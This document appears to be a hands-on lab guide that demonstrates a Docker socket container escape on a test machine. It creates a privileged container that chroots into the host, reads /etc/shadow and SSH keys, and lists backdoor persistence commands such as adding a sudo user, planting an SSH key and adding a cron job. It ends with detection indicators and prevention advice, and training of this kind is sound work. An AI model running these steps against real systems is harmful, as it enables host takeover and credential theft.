# Manual Step-by-Step Guide: Docker Socket Escape

This guide walks you through the Docker socket escape manually, explaining each step.

## ⚠️ Safety First

- Only run in isolated test environment
- Understand each command before executing
- Document your findings
- Clean up when finished

## 🎯 Overview

You will:
1. Create a vulnerable container with docker.sock mounted
2. Install Docker CLI inside that container
3. Use the CLI to create a privileged container
4. Gain root access to the host

**Time:** 20-25 minutes

---

## Step 1: Create Vulnerable Container (2 minutes)

```bash
# Create container with docker.sock mounted
docker run -d --name vulnerable-container \
  -v /var/run/docker.sock:/var/run/docker.sock \
  ubuntu:22.04 \
  sleep infinity

# Verify it's running
docker ps | grep vulnerable-container
```

**What just happened:**
- Created Ubuntu container
- Mounted `/var/run/docker.sock` into container
- Container can now talk to Docker daemon
- Daemon runs as root on host

**Check your work:**
```bash
# Verify socket is mounted
docker exec vulnerable-container ls -la /var/run/docker.sock

# Should show: srw-rw---- 1 root docker docker.sock
```

---

## Step 2: Access the Container (1 minute)

```bash
# Get interactive shell
docker exec -it vulnerable-container bash

# You're now inside the container
```

**Inside the container, run:**
```bash
whoami
# Output: root (root inside container, not host)

hostname
# Output: container ID (not host hostname)

ls -la /var/run/docker.sock
# Socket is accessible!
```

---

## Step 3: Install Docker CLI (3-4 minutes)

**Still inside the container:**

```bash
# Update package lists
apt-get update

# Install docker CLI
apt-get install -y docker.io

# Also install useful tools
apt-get install -y curl jq
```

**Verify installation:**
```bash
docker --version
# Should show: Docker version XX.XX.XX

which docker
# Should show: /usr/bin/docker
```

---

## Step 4: Verify Docker Access (2 minutes)

**Still inside the container:**

```bash
# List containers on the HOST
docker ps

# You should see:
# - vulnerable-container (that's YOU!)
# - Any other containers running on host
```

**This is the critical moment!** You're inside a container, but can see and control ALL containers on the host.

```bash
# Get Docker system info
docker info

# Look for:
# - Operating System: (host OS, not container)
# - Total containers
# - Running containers
```

**Save this information:**
```bash
docker ps -a > /tmp/host_containers.txt
docker info > /tmp/host_info.txt

cat /tmp/host_containers.txt
```

---

## Step 5: Create Escape Container (5 minutes)

**Still inside the vulnerable container:**

This is where the escape happens. We'll create a NEW container that:
- Has ALL privileges (`--privileged`)
- Uses host network (`--net=host`)
- Uses host PID namespace (`--pid=host`)
- Mounts host root at `/host` (`-v /:/host`)

```bash
# Create the escape container
docker run -it --rm \
  --privileged \
  --pid=host \
  --net=host \
  --ipc=host \
  --volume /:/host \
  ubuntu:22.04 \
  chroot /host bash
```

**What each flag does:**

| Flag | Purpose |
|------|---------|
| `--privileged` | Removes all restrictions, enables all capabilities |
| `--pid=host` | Use host's PID namespace (see all host processes) |
| `--net=host` | Use host's network namespace (host network access) |
| `--ipc=host` | Use host's IPC namespace |
| `-v /:/host` | Mount host root filesystem at /host |
| `chroot /host` | Change root to host filesystem |

---

## Step 6: Verify Host Access (5 minutes)

**You should now be in a new shell. This shell has ROOT ACCESS TO THE HOST!**

**Verify you're on the host:**

```bash
# Check hostname
hostname
# Should show HOST hostname (not container ID)

# Check processes
ps aux | head -n 10
# Should show HOST processes (systemd, etc.)

# Check users
cat /etc/passwd | head -n 5
# Should show HOST users

# Check kernel
uname -a
# Should show HOST kernel
```

**Critical test - Check Docker:**
```bash
docker ps
# Should show containers from HOST perspective
# Including the vulnerable-container you started from!
```

---

## Step 7: Demonstrate Access (3 minutes)

**Now that you have host access, demonstrate what's possible:**

```bash
# 1. Read sensitive files
cat /etc/shadow | head -n 3
# Shows password hashes

# 2. Check SSH keys
ls -la /root/.ssh/
# Shows root's SSH keys

# 3. Read Docker configs
cat /etc/docker/daemon.json 2>/dev/null || echo "No custom config"

# 4. List all mounted filesystems
mount | grep -E "^/dev"

# 5. Check sudo configuration
cat /etc/sudoers | grep -v "^#" | grep -v "^$"
```

**Create proof of compromise:**
```bash
# Create proof file
echo "COMPROMISED - $(date)" > /root/PWNED_PROOF.txt

# Verify it exists
cat /root/PWNED_PROOF.txt

# Check on actual host (in another terminal)
# Open new terminal on host and run:
# cat /root/PWNED_PROOF.txt
# The file is on the REAL host!
```

---

## Step 8: Post-Exploitation Possibilities (Review Only)

**DO NOT execute these - just understand what's possible:**

```bash
# Add backdoor user (DON'T RUN)
# useradd -m -s /bin/bash -G sudo attacker
# echo "attacker:password" | chpasswd

# Install SSH backdoor (DON'T RUN)
# mkdir -p /root/.ssh
# echo "ssh-rsa ATTACKER_KEY..." >> /root/.ssh/authorized_keys

# Install cron backdoor (DON'T RUN)
# echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab

# Access other containers' secrets (DON'T RUN)
# docker exec other-container cat /run/secrets/api_key
```

---

## Step 9: Understanding the Attack (5 minutes)

**Exit from the escape container:**
```bash
exit  # Exit from chroot
```

You should be back in the vulnerable-container.

**Let's understand what happened:**

```mermaid
graph TD
    A[Host Machine] -->|Runs| B[Docker Daemon]
    B -->|Creates| C[vulnerable-container]
    C -->|Has mounted| D[/var/run/docker.sock]
    D -->|Connects to| B
    C -->|Uses socket to create| E[escape-container]
    E -->|Has flags| F[--privileged + --pid=host + -v /:/host]
    F -->|Provides| G[Complete Host Access]
```

**The vulnerability chain:**
1. **Misconfiguration:** Mounted docker.sock in container
2. **API Access:** Container can call Docker API
3. **Privilege Escalation:** Create privileged container
4. **Namespace Escape:** Access host namespaces
5. **Root Access:** Full control of host

---

## Step 10: Cleanup (2 minutes)

**Exit the vulnerable container:**
```bash
exit  # Exit from vulnerable-container
```

**Clean up containers:**
```bash
# Remove vulnerable container
docker rm -f vulnerable-container

# Remove escape container (if still running)
docker rm -f escape-container

# Remove proof file
sudo rm -f /root/PWNED_PROOF.txt
```

**Verify cleanup:**
```bash
docker ps -a | grep -E "vulnerable|escape"
# Should show nothing
```

---

## 📊 What You Learned

✅ How docker.sock mounting enables escapes  
✅ Docker API provides root-level access  
✅ Creating privileged containers from containers  
✅ Using chroot to escape to host filesystem  
✅ Post-exploitation possibilities  
✅ Why this configuration is dangerous  

---

## 🔍 Key Indicators to Detect

When monitoring, look for:
1. **File access:** `/var/run/docker.sock` accessed from container
2. **Process:** `docker` command running in container
3. **API calls:** Container making Docker API requests
4. **Container creation:** Privileged container created by container
5. **Syscalls:** `chroot` in privileged container

---

## 🛡️ How to Prevent

**Never do this:**
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock  ❌
```

**Instead:**
1. Use Docker socket proxy with ACL
2. Use rootless Docker
3. Use Kubernetes (no socket needed)
4. Use Docker API with authentication
5. Implement authorization plugins

---

## 📝 Documentation

Create a report with:
- [ ] Screenshots of each step
- [ ] Command outputs
- [ ] Proof files
- [ ] Timeline of attack
- [ ] Detection signatures identified
- [ ] Lessons learned

---

## ✅ Completion Checklist

- [ ] Created vulnerable container
- [ ] Installed Docker CLI
- [ ] Listed host containers
- [ ] Created escape container
- [ ] Achieved host root access
- [ ] Demonstrated file access
- [ ] Created proof file
- [ ] Understood attack chain
- [ ] Documented findings
- [ ] Cleaned up all containers

---

## 🎓 Quiz Yourself

1. Why does mounting docker.sock enable escape?
2. What does `--privileged` actually do?
3. Why is `chroot /host` necessary?
4. What would rootless Docker prevent?
5. How would you detect this in production?

---

**Next:** Try the automated script (`./exploit.sh`) to see everything automated, then move to Scenario 2!